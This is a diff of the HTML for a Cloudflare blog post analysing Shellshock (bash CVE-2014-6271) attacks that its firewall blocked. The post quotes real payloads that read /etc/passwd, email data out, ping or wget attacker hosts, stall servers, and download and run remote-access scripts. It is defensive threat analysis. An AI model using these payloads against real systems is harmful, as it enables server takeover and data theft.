@@ -1,117 +1,132 @@
-<div class="mb2 gray5">10 min read</div>
-<div class="post-content lh-copy gray1"><!--kg-card-begin: markdown-->
+<div class="mb2 gray5">9 min read</div><img class="mr2" src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/4KJYmql9e9J7bf7tHMJRh5/4f867358dda56f4dd77b1c0b8197595b/inside-shellshock.png" alt="">
+<div class="post-content lh-copy gray1">
 	<p>On Wednesday of last week, details of the <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a> bash bug emerged. This bug started a scramble to patch computers, servers, routers, firewalls, and other computing appliances using vulnerable versions of bash.</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2014/10/illustration-bash-blog-1.png" alt="" loading="lazy"></p>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/6L3sgALNPL4lzR339hqcdb/9553cb40d33169e9da1865358d8c37f9/illustration-bash-blog-1.png" alt="" class="kg-image" width="1900" height="640" loading="lazy">
+
+	</figure>
 	<p>CloudFlare immediately rolled out <a href="https://blog.cloudflare.com/bash-vulnerability-cve-2014-6271-patched">protection for Pro, Business, and Enterprise customers</a> through our Web Application Firewall. On Sunday, after studying the extent of the problem, and looking at logs of attacks stopped by our WAF, we decided to roll out <a href="https://blog.cloudflare.com/shellshock-protection-enabled-for-all-customers">protection for our Free plan customers</a> as well.</p>
 	<p>Since then we've been monitoring attacks we've stopped in order to understand what they look like, and where they come from. Based on our observations, it's clear that hackers are exploiting Shellshock worldwide.</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2014/09/287665619_2418591122_z.jpg" alt="" loading="lazy"><br>
-		<small>(CC BY 2.0 <a href="https://www.flickr.com/photos/aussiegall">aussiegall</a>)</small>
-	</p>
-	<h2 id="eject">Eject</h2>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/6GuExiKPJg7xHj26otgdYi/884b14b0ecd5451c82597f75eba7cf83/287665619_2418591122_z.jpg" alt="" class="kg-image" width="640" height="452" loading="lazy">
+
+	</figure>
+	<p>(CC BY 2.0 <a href="https://www.flickr.com/photos/aussiegall">aussiegall</a>)</p>
+	<h2>Eject</h2>
 	<p>The Shellshock problem is an example of an <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">arbitrary code execution (ACE)</a> vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.</p>
 	<p>Attacker will also use an ACE vulnerability to upload or run a program that gives them a simple way of controlling the targeted machine. This is often achieved by running a "shell". A shell is a command-line where commands can be entered and executed.</p>
 	<p>The Shellshock vulnerability is a major problem because it removes the need for specialized knowledge, and provides a simple (unfortunately, very simple) way of taking control of another computer (such as a web server) and making it run code.</p>
 	<p>Suppose for a moment that you wanted to attack a web server and make its CD or DVD drive slide open. There's actually a command on Linux that will do that: <code>/bin/eject</code>. If a web server is vulnerable to Shellshock you could attack it by adding the magic string <code>() { :; };</code> to <code>/bin/eject</code> and then sending that string to the target computer over HTTP. Normally, the <code>User-Agent</code> string would identify the type of browser you are using, but, in in the case of the Shellshock vulnerability, it can be set to say anything.</p>
 	<p>For example, if example.com was vulnerable then</p>
-	<pre><code>curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/</code></pre>
 	<p>would be enough to actually make the CD or DVD drive eject.</p>
 	<p>In monitoring the Shellshock attacks we've blocked, we've actually seen someone attempting precisely that attack. So, if you run a web server and suddenly find an ejected DVD it might be an indication that your machine is vulnerable to Shellshock.</p>
-	<h2 id="whythatsimpleattackworks">Why that simple attack works</h2>
+	<h2>Why that simple attack works</h2>
 	<p>When a web server receives a request for a page there are three parts of the request that can be susceptible to the Shellshock attack: the request URL, the headers that are sent along with the URL, and what are known as "arguments" (when you enter your name and address on a web site it will typically be sent as arguments in the request).</p>
 	<p>For example, here's an actual HTTP request that retrieves the CloudFlare homepage:</p>
-	<pre><code>GET / HTTP/1.1
+	<pre class="language-bash"><code class="language-bash">GET / HTTP/1.1
 Accept-Encoding: gzip,deflate,sdch
 Accept-Language: en-US,en;q=0.8,fr;q=0.6
 Cache-Control: no-cache
 Pragma: no-cache
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
-Host: cloudflare.com
-</code></pre>
+Host: cloudflare.com</code></pre>
 	<p>In this case the URL is <code>/</code> (the main page) and the headers are <code>Accept-Encoding</code>, <code>Accept-Language</code>, etc. These headers provide the web server with information about the capabilities of my web browser, my preferred language, the web site I'm looking for, and what browser I am using.</p>
 	<p>It's not uncommon for these to be turned into variables inside a web server so that the web server can examine them. (The web server might want to know what my preferred language is so it can decide how to respond to me).</p>
 	<p>For example, inside the web server responding to the request for the CloudFlare home page it's possible that the following variables are defined by copying the request headers character by character.</p>
-	<pre><code>HTTP_ACCEPT_ENCODING=gzip,deflate,sdch
+	<pre class="language-bash"><code class="language-bash">HTTP_ACCEPT_ENCODING=gzip,deflate,sdch
 HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.8,fr;q=0.6
 HTTP_CACHE_CONTROL=no-cache
 HTTP_PRAGMA=no-cache
 HTTP_USER_AGENT=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
-HTTP_HOST=cloudflare.com
-</code></pre>
+HTTP_HOST=cloudflare.com</code></pre>
 	<p>As long as those variables remain inside the web server software, and aren't passed to other programs running on the web server, the server is not vulnerable.</p>
 	<p>Shellshock occurs when the variables are passed into the shell called "bash". Bash is a common shell used on Linux systems. Web servers quite often need to run other programs to respond to a request, and it's common that these variables are passed into bash or another shell.</p>
 	<p>The Shellshock problem specifically occurs when an attacker modifies the origin HTTP request to contain the magic <code>() { :; };</code> string discussed above.</p>
 	<p>Suppose the attacker change the User-Agent header above from <code>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36</code> to simply <code>() { :; }; /bin/eject</code>. This creates the following variable inside a web server:</p>
-	<pre><code>HTTP_USER_AGENT=() { :; }; /bin/eject
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">HTTP_USER_AGENT=() { :; }; /bin/eject</code></pre>
 	<p>If that variable gets passed into bash by the web server, the Shellshock problem occurs. This is because bash has special rules for handling a variable starting with <code>() { :; };</code>. Rather than treating the variable <code>HTTP_USER_AGENT</code> as a sequence of characters with no special meaning, bash will interpret it as a command that needs to be executed (I've omitted the deeply technical explanations of why <code>() { :; };</code> makes bash behave like this for the sake of clarity in this essay.)</p>
 	<p>The problem is that <code>HTTP_USER_AGENT</code> came from the <code>User-Agent</code> header which is something an attacker controls because it comes into the web server in an HTTP request. And that's a recipe for disaster because an attacker can make a vulnerable server run any command it wants (see examples below).</p>
 	<p>The solution is to upgrade bash to a version that doesn't interpret <code>() { :; };</code> in a special way.</p>
-	<h2 id="whereattacksarecomingfrom">Where attacks are coming from</h2>
+	<h2>Where attacks are coming from</h2>
 	<p>When we rolled out protection for all customers we put in place a metric that allowed us to monitor the number of Shellshock attacks attempted. They all received an HTTP 403 Forbidden error code, but we kept a log of when they occurred and basic information about the attack.</p>
 	<p>This chart shows the number of attacks per second across the CloudFlare network since rolling out protection for all customers.</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2014/09/Screen-Shot-2014-09-30-at-8-56-33.png" alt="" loading="lazy"></p>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/4lNLTw4OkPvCuli6C26Jht/8f010cf307bcf3cfcf9bf26ade63a74c/Screen-Shot-2014-09-30-at-8-56-33.png" alt="" class="kg-image" width="2136" height="906" loading="lazy">
+
+	</figure>
 	<p>From the moment CloudFlare turned on our Shellshock protection up until early this morning, we were seeing 10 to 15 attacks per second. In order of attack volume, these requests were coming from France (80%), US (7%), Netherlands (7%), and then smaller volumes from many other countries.</p>
 	<p>At about 0100 Pacific (1000 in Paris) the attacks from France ceased. We are currently seeing around 5 attacks per second. At the time of writing, we've blocked well over 1.1m Shellshock attacks.</p>
-	<h2 id="letyourimaginationrunwild">Let your imagination run wild</h2>
+	<h2>Let your imagination run wild</h2>
 	<p>Since its so easy to attack vulnerable machines with Shellshock, and because a vulnerable machine will run any command sent to it, attackers have let their imaginations run wild with ways to manipulate computers remotely.</p>
 	<p>CloudFlare’s WAF logs the reason it blocked a request allowing us to extract and analyze the actual Shellshock strings being used. Shellshock is being used primarily for reconnaissance: to extract private information, and to allow attackers to gain control of servers.</p>
 	<p>Most of the Shellshock commands are being injected using the HTTP User-Agent and Referer headers, but attackers are also using GET and POST arguments and other random HTTP headers.</p>
 	<p>To extract private information, attackers are using a couple of techniques. The simplest extraction attacks are in the form:</p>
-	<pre><code>() {:;}; /bin/cat /etc/passwd
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">() {:;}; /bin/cat /etc/passwd</code></pre>
 	<p>That reads the password file <code>/etc/passwd</code>, and adds it to the response from the web server. So an attacker injecting this code through the Shellshock vulnerability would see the password file dumped out onto their screen as part of the web page returned.</p>
 	<p>In one attack they simply email private files to themselves. To get data out via email, attackers are using the <code>mail</code> command like this:</p>
-	<pre><code>() { :;}; /bin/bash -c \"whoami | mail -s 'example.com l' xxxxxxxxxxxxxxxx@gmail.com
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">() { :;}; /bin/bash -c \"whoami | mail -s 'example.com l' xxxxxxxxxxxxxxxx@gmail.com</code></pre>
 	<p>That command first runs <code>whoami</code> to find out the name of the user running the web server. That's especially useful because if the web server is being run as root (the superuser who can do anything) then the server will be a particularly rich target.</p>
 	<p>It then sends the user name along with the name of the web site being attacked (example.com above) via email. The name of the website appears in the email subject line.</p>
 	<p>At their leisure, the attacker can log into their email and find out which sites were vulnerable. The same email technique can be used to extract data like the password file.</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2014/09/7439564750_b9ca34855c_z.jpg" alt="" loading="lazy"><br>
-		<small>(CC BY 2.0 <a href="https://www.flickr.com/photos/jdhancock">JD Hancock</a>)</small>
-	</p>
-	<h2 id="reconnaissance">Reconnaissance</h2>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/52ocewvPYryPE5fI5rAsLQ/28b3796bcfbd33593cda53cdc00fb18d/7439564750_b9ca34855c_z.jpg" alt="" class="kg-image" width="640" height="426" loading="lazy">
+
+	</figure>
+	<p>(CC BY 2.0 <a href="https://www.flickr.com/photos/jdhancock">JD Hancock</a>)</p>
+	<h2>Reconnaissance</h2>
 	<p>By far the most popular attack we've seen (around 83% of all attacks) is called “reconnaissance”. In reconnaissance attacks, the attacker sends a command that will send a message to a third-party machine. The third-party machine will then compile a list of all the vulnerable machines that have contacted it.</p>
 	<p>In the past, we've seen lists of compromised machines being turned into botnets for DDoS, spam, or other purposes.</p>
 	<p>A popular reconnaissance technique uses the <code>ping</code> command to get a vulnerable machine to send a single packet (called a ping) to a third-party server that the attacker controls. The attack string looks like this:</p>
-	<pre><code>() {:;}; ping -c 1 -p cb18cb3f7bca4441a595fcc1e240deb0 attacker-machine.com
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">() {:;}; ping -c 1 -p cb18cb3f7bca4441a595fcc1e240deb0 attacker-machine.com</code></pre>
 	<p>The <code>ping</code> command is normally used to test whether a machine is “alive” or online (an alive machine responds with its own ping). If a web server is vulnerable to Shellshock then it will send a single ping packet (the <code>-c 1</code>) to attacker-machine.com with a payload set by the <code>-p</code>. The payload is a unique ID created by the attacker so they can trace the ping back to the vulnerable web site.</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2014/09/illustration-bash-blog.png" alt="" loading="lazy"></p>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2mNsjINkqc8mE1B3zc22oU/24e9ce2277ad1910685e09bdbc1815a0/illustration-bash-blog.png" alt="" class="kg-image" width="1800" height="735" loading="lazy">
+
+	</figure>
 	<p>Another technique being used to identify vulnerable servers is to make the web server download a web page from an attacker-controlled machine. The attacker can then look in their web server logs to find out which machine was vulnerable. This attack works by sending a Shellshock string like:</p>
-	<pre><code>() {:;}; /usr/bin/wget http://attacker-controlled.com/ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA== &gt;&gt; /dev/null
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">() {:;}; /usr/bin/wget http://attacker-controlled.com/ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA== &gt;&gt; /dev/null</code></pre>
 	<p>The attacker looks in the web server log of attacker-controlled.com for entries. The page downloaded is set up by the attacker to be reveal the name of the site being attacked. The <code>ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA==</code> is actually a code indicating that the attacked site was example.com.</p>
 	<p><code>ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA==</code> is actually a <a href="https://en.wikipedia.org/wiki/Base64">base64</a> encoded string. When it is decoded it reads:</p>
-	<pre><code>example.comShellShockSalt
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">example.comShellShockSalt</code></pre>
 	<p>From this string the attacker can find out if their attack on example.com was successful, and, if so, they can then go back later to further exploit that site. While I've substituted out the domain that was the target, we are seeing real examples in the wild actually using <code>ShellShockSalt</code> as the salt in the hash.</p>
-	<h2 id="denialofservice">Denial of Service</h2>
+	<h2>Denial of Service</h2>
 	<p>Another Shellshock attack uses this string</p>
-	<pre><code>() { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">() { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20</code></pre>
 	<p>It attempts to run the <code>sleep</code> command in three different ways (since systems have slightly different configurations, sleep might be found in the directories <code>/bin</code> or <code>/sbin</code> or <code>/usr/bin</code>). Whichever sleep it runs, it causes the server to wait 20 seconds before replying . That will consume resources on the machine because a thread or process executing the <code>sleep</code> will do nothing else for 20 seconds.</p>
 	<p>This is perhaps the simplest denial-of-service of all. The attackers simply tells the machine to sleep for a while. Send enough of those commands, and the machine could be tied up doing nothing and unable to service legitimate requests.</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2014/09/3894184210_47762c00a9_z.jpg" alt="" loading="lazy"><br>
-		<small>(CC BY 2.0 <a href="https://www.flickr.com/photos/petercastleton">peter castleton</a>)</small>
-	</p>
-	<h2 id="takingcontrol">Taking Control</h2>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/17Zh1JXPfZfNKPfYkhiRN2/6a97b0c5bcc16e8ac10585274dacb2d5/3894184210_47762c00a9_z.jpg" alt="" class="kg-image" width="640" height="425" loading="lazy">
+
+	</figure>
+	<p>(CC BY 2.0 <a href="https://www.flickr.com/photos/petercastleton">peter castleton</a>)</p>
+	<h2>Taking Control</h2>
 	<p>Around 8% of the attacks we've seen so far have been aimed at directly taking control of a server. Remote control attacks look like this:</p>
-	<pre><code>() { :;}; /bin/bash -c \"cd /tmp;wget http://213.x.x.x/ji;curl -O /tmp/ji http://213.x.x.x/ji ; perl /tmp/ji;rm -rf /tmp/ji\"
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">() { :;}; /bin/bash -c \"cd /tmp;wget http://213.x.x.x/ji;curl -O /tmp/ji http://213.x.x.x/ji ; perl /tmp/ji;rm -rf /tmp/ji\"</code></pre>
 	<p>This command tries to use two programs (<code>wget</code> and <code>curl</code>) to downloaded a program from a server that the attacker controls. The program is written in the Perl language, and once downloaded it is immediately run. This program sets up remote access for an attacker to the vulnerable web server.</p>
 	<p>Another attack uses the Python language to set up a program that can be used to remotely run any command on the vulnerable machine:</p>
-	<pre><code>() { :;}; /bin/bash -c \"/usr/bin/env curl -s http://xxxxxxxxxxxxxxx.com/cl.py &gt; /tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update &gt; /dev/null&amp; sleep 5; rm -rf /tmp/clamd_update\"
-</code></pre>
+	<pre class="language-bash"><code class="language-bash">() { :;}; /bin/bash -c \"/usr/bin/env curl -s http://xxxxxxxxxxxxxxx.com/cl.py &gt; /tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update &gt; /dev/null&amp; sleep 5; rm -rf /tmp/clamd_update\"</code></pre>
 	<p>The <code>cl.py</code> program downloaded is made to look like an update to the ClamAV antivirus program. After a delay of 5 seconds, the attack cleans up after itself by removing the downloaded file (leaving it running only in memory).</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2014/09/6933311011_3b385e28c8_o.jpg" alt="" loading="lazy"><br>
-		<small>(CC BY 2.0 <a href="https://www.flickr.com/photos/custom-painting-studio">Jeff Taylor</a>)</small>
-	</p>
-	<h2 id="targetselection">Target Selection</h2>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1ikGFv90UzO7oo38QMIywN/fc63f9d8e94d290de2cd86fae0e92f70/6933311011_3b385e28c8_o.jpg" alt="" class="kg-image" width="600" height="452" loading="lazy">
+
+	</figure>
+	<p>(CC BY 2.0 <a href="https://www.flickr.com/photos/custom-painting-studio">Jeff Taylor</a>)</p>
+	<h2>Target Selection</h2>
 	<p>Looking at the web sites being attacked, and the URLs being requested, it's possible to make an educated guess at the specific web applications being attacked.</p>
 	<p>The top URLs we've seen attacked are: / (23.00%), /cgi-bin-sdb/printenv (15.12%), /cgi-mod/index.cgi (14.93%), /cgi-sys/entropysearch.cgi (15.20%) and /cgi-sys/defaultwebpage.cgi (14.59%). Some of these URLs are used by popular web applications and even a hardware appliance.</p>
 	<p>It appears that 23% of the attacks are directed against the <a href="http://cpanel.net">cPanel</a> web hosting control software, 15% against old Apache installations, and 15% against the <a href="https://www.barracuda.com">Barracuda</a> hardware products which have a web-based interface.</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2014/09/cpanel.png" alt="" loading="lazy"></p>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/486boXqbgwzEOIjozq8rKI/123b722fd5d8340681ad7c6f38bad89f/cpanel.png" alt="" class="kg-image" width="1944" height="778" loading="lazy">
+
+	</figure>
 	<p>The latter is interesting because it highlights the fact that Shellshock isn't just an attack on web sites: it's an attack on anything that's running bash and accessible across the Internet. That could include hardware devices, set-top boxes, laptop computers, even, perhaps, telephones.</p>
-	<!--kg-card-end: markdown-->
 </div>
